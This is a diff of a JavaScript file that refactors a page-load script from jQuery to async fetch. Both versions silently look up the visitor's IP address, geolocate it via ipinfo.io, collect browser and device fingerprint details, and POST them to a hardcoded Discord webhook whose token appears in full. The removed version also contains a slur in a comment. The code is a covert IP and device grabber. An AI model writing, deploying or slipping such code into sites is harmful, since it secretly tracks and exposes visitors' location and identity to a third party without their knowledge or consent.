@@ -1,120 +1,66 @@
-function getDeviceDetails() {  
-  const details = {  
-   userAgent: navigator.userAgent,  
-   platform: navigator.platform,  
-   language: navigator.language,  
-   screenWidth: window.screen.width,  
-   screenHeight: window.screen.height,  
-   colorDepth: window.screen.colorDepth,  
-   pixelDepth: window.screen.pixelDepth,  
-   online: navigator.onLine,  
-  };  
+function getDeviceDetails() {
+  const details = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    colorDepth: window.screen.colorDepth,
+    pixelDepth: window.screen.pixelDepth,
+    online: navigator.onLine,
+    isMobile: /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+    isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+  };
+  return Promise.resolve(details);
+}
+
+function sendToWebhook(webhookUrl, data) {
+  return fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ embeds: [data] })
+  });
+}
+
+async function collectAndSend() {
+  const webhookUrl = 'https://discord.com/api/webhooks/1305775707019935787/29_mxdVcutrhmUed8uuqry1-IKZyXodX8puHIjiDy0Ae61qxf_aAFABHziiNX0x8-X79';
   
-  // nicecode(retard)  
-  if (/Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {  
-   details.isMobile = true;  
-  } else {  
-   details.isMobile = false;  
-  }  
-  
-  if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {  
-   details.isTouchDevice = true;  
-  } else {  
-   details.isTouchDevice = false;  
-  }  
-  
-  return Promise.resolve(details);  
-}  
-  
-$(document).ready(function () {  
-  $.get("https://api.ipify.org?format=json", function (data) {  
-   $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {  
-    getDeviceDetails().then(function (deviceDetails) {  
-      const embed = {  
-       "title": "Device Information",  
-       "description": "IP Address: " + data.ip,  
-       "fields": [  
-        {  
-          "name": "Country",  
-          "value": ipData.country,  
-          "inline": true  
-        },  
-        {  
-          "name": "Region",  
-          "value": ipData.region,  
-          "inline": true  
-        },  
-        {  
-          "name": "City",  
-          "value": ipData.city,  
-          "inline": true  
-        },  
-        {  
-          "name": "VPN",  
-          "value": ipData.usingVPN === true ? "Detected" : "Not Detected",  
-          "inline": true  
-        },  
-        {  
-          "name": "User Agent",  
-          "value": deviceDetails.userAgent,  
-          "inline": false  
-        },  
-        {  
-          "name": "Platform",  
-          "value": deviceDetails.platform,  
-          "inline": true  
-        },  
-        {  
-          "name": "Language",  
-          "value": deviceDetails.language,  
-          "inline": true  
-        },  
-        {  
-          "name": "Screen Width",  
-          "value": deviceDetails.screenWidth,  
-          "inline": true  
-        },  
-        {  
-          "name": "Screen Height",  
-          "value": deviceDetails.screenHeight,  
-          "inline": true  
-        },  
-        {  
-          "name": "Color Depth",  
-          "value": deviceDetails.colorDepth,  
-          "inline": true  
-        },  
-        {  
-          "name": "Pixel Depth",  
-          "value": deviceDetails.pixelDepth,  
-          "inline": true  
-        },  
-        {  
-          "name": "Online",  
-          "value": deviceDetails.online,  
-          "inline": true  
-        },  
-        {  
-          "name": "Is Mobile",  
-          "value": deviceDetails.isMobile,  
-          "inline": true  
-        },  
-        {  
-          "name": "Is Touch Device",  
-          "value": deviceDetails.isTouchDevice,  
-          "inline": true  
-        }  
-       ]  
-      };  
-  
-      $.ajax({  
-       url: "https://discord.com/api/webhooks/1305775707019935787/29_mxdVcutrhmUed8uuqry1-IKZyXodX8puHIjiDy0Ae61qxf_aAFABHziiNX0x8-X79",  
-       type: 'POST',  
-       data: JSON.stringify({ "embeds": [embed] }),  
-       contentType: 'application/json'  
-      });  
-    });  
-   });  
-  });  
-});
-          
+  try {
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    
+    const ipInfoResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
+    const ipInfo = await ipInfoResponse.json();
+    
+    const deviceDetails = await getDeviceDetails();
+    
+    const embed = {
+      title: "Device Information",
+      description: `IP Address: ${ipData.ip}`,
+      fields: [
+        { name: "Country", value: ipInfo.country, inline: true },
+        { name: "Region", value: ipInfo.region, inline: true },
+        { name: "City", value: ipInfo.city, inline: true },
+        { name: "User Agent", value: deviceDetails.userAgent, inline: false },
+        { name: "Platform", value: deviceDetails.platform, inline: true },
+        { name: "Language", value: deviceDetails.language, inline: true },
+        { name: "Screen Resolution", value: `${deviceDetails.screenWidth}x${deviceDetails.screenHeight}`, inline: true },
+        { name: "Color Depth", value: deviceDetails.colorDepth.toString(), inline: true },
+        { name: "Pixel Depth", value: deviceDetails.pixelDepth.toString(), inline: true },
+        { name: "Online", value: deviceDetails.online.toString(), inline: true },
+        { name: "Is Mobile", value: deviceDetails.isMobile.toString(), inline: true },
+        { name: "Is Touch Device", value: deviceDetails.isTouchDevice.toString(), inline: true }
+      ]
+    };
+
+    await sendToWebhook(webhookUrl, embed);
+    console.log('Data sent successfully');
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+
+// Start collection when document is ready
+document.addEventListener('DOMContentLoaded', collectAndSend);
